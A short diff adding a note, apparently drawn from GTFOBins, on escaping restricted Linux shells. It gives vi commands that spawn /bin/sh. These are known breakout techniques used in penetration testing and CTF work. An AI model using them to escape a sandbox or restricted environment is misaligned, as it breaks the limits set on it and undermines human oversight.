@@ -1,0 +1,16 @@
+Escape restricted shell for almost every prog running on linux
+
+https://gtfobins.github.io/#+shell
+
+
+Examples: 
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+    vi -c ':!/bin/sh' /dev/null
+
+    vi
+    :set shell=/bin/sh
+    :shell
+
